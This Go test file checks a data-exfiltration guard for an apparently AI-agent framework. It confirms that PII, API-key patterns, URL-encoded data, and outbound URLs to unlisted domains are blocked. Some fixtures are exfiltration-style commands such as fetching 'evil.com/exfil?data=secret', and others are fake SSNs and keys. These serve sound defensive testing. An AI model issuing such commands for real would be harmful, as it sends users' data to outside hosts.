package agentic

import (
	"context"
	"testing"

	"github.com/lookatitude/beluga-ai/guard"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestDataExfiltrationGuard_Name(t *testing.T) {
	g := NewDataExfiltrationGuard()
	assert.Equal(t, "data_exfiltration_guard", g.Name())
}

func TestDataExfiltrationGuard_Validate(t *testing.T) {
	tests := []struct {
		name    string
		opts    []ExfiltrationOption
		input   guard.GuardInput
		allowed bool
		reason  string
	}{
		{
			name:    "clean content allows",
			input:   guard.GuardInput{Content: "hello world", Metadata: map[string]any{}},
			allowed: true,
		},
		{
			name:    "SSN detected blocks",
			input:   guard.GuardInput{Content: "my ssn is 123-45-6789", Metadata: map[string]any{}},
			allowed: false,
			reason:  "potential ssn detected",
		},
		{
			name:    "email detected blocks",
			input:   guard.GuardInput{Content: `send to user@example.com`, Metadata: map[string]any{}},
			allowed: false,
			reason:  "potential email detected",
		},
		{
			name:    "API key pattern detected blocks",
			input:   guard.GuardInput{Content: `api_key=sk-1234567890abcdef`, Metadata: map[string]any{}},
			allowed: false,
			reason:  "potential api_key detected",
		},
		{
			name: "PII in JSON string values detected",
			input: guard.GuardInput{
				Content:  `{"name": "John", "email": "john@example.com"}`,
				Metadata: map[string]any{},
			},
			allowed: false,
			reason:  "potential email detected",
		},
		{
			name: "URL blocking with no allowed domains",
			opts: []ExfiltrationOption{
				WithoutDefaultPII(),
				WithBlockURLs(true),
				WithScanURLEncoding(false),
			},
			input: guard.GuardInput{
				Content:  `fetch https://evil.com/exfil?data=secret`,
				Metadata: map[string]any{},
			},
			allowed: false,
			reason:  "outbound URL detected",
		},
		{
			name: "URL blocking with allowed domains passes",
			opts: []ExfiltrationOption{
				WithoutDefaultPII(),
				WithBlockURLs(true),
				WithAllowedDomains("api.example.com"),
				WithScanURLEncoding(false),
			},
			input: guard.GuardInput{
				Content:  `fetch https://api.example.com/data`,
				Metadata: map[string]any{},
			},
			allowed: true,
		},
		{
			name: "URL blocking with parent domain match",
			opts: []ExfiltrationOption{
				WithoutDefaultPII(),
				WithBlockURLs(true),
				WithAllowedDomains("example.com"),
				WithScanURLEncoding(false),
			},
			input: guard.GuardInput{
				Content:  `fetch https://api.example.com/data`,
				Metadata: map[string]any{},
			},
			allowed: true,
		},
		{
			name: "URL blocking rejects unlisted domain",
			opts: []ExfiltrationOption{
				WithoutDefaultPII(),
				WithBlockURLs(true),
				WithAllowedDomains("example.com"),
				WithScanURLEncoding(false),
			},
			input: guard.GuardInput{
				Content:  `fetch https://evil.com/steal`,
				Metadata: map[string]any{},
			},
			allowed: false,
			reason:  `outbound URL to disallowed domain "evil.com" detected`,
		},
		{
			name: "URL-encoded content blocks",
			opts: []ExfiltrationOption{
				WithoutDefaultPII(),
				WithScanURLEncoding(true),
			},
			input: guard.GuardInput{
				Content:  `data%3Dsecret%26key%3Dvalue`,
				Metadata: map[string]any{},
			},
			allowed: false,
			reason:  "suspicious URL-encoded data",
		},
		{
			name: "max content length exceeded",
			opts: []ExfiltrationOption{
				WithoutDefaultPII(),
				WithMaxContentLength(10),
				WithScanURLEncoding(false),
			},
			input: guard.GuardInput{
				Content:  "this is a very long content string",
				Metadata: map[string]any{},
			},
			allowed: false,
			reason:  "content length",
		},
		{
			name: "custom PII pattern",
			opts: []ExfiltrationOption{
				WithoutDefaultPII(),
				WithPIIPattern("passport", `[A-Z]\d{8}`),
				WithScanURLEncoding(false),
			},
			input: guard.GuardInput{
				Content:  "passport: A12345678",
				Metadata: map[string]any{},
			},
			allowed: false,
			reason:  "potential passport detected",
		},
		{
			name: "no PII patterns allows everything",
			opts: []ExfiltrationOption{
				WithoutDefaultPII(),
				WithScanURLEncoding(false),
			},
			input: guard.GuardInput{
				Content:  "ssn 123-45-6789 email user@test.com",
				Metadata: map[string]any{},
			},
			allowed: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			g := NewDataExfiltrationGuard(tt.opts...)
			result, err := g.Validate(context.Background(), tt.input)
			require.NoError(t, err)
			assert.Equal(t, tt.allowed, result.Allowed)
			if tt.reason != "" {
				assert.Contains(t, result.Reason, tt.reason)
			}
		})
	}
}

func TestDataExfiltrationGuard_ContextCancellation(t *testing.T) {
	g := NewDataExfiltrationGuard()
	ctx, cancel := context.WithCancel(context.Background())
	cancel()

	_, err := g.Validate(ctx, guard.GuardInput{
		Content:  "test",
		Metadata: map[string]any{},
	})
	assert.ErrorIs(t, err, context.Canceled)
}

func TestDataExfiltrationGuard_CompileTimeCheck(t *testing.T) {
	var _ guard.Guard = (*DataExfiltrationGuard)(nil)
}
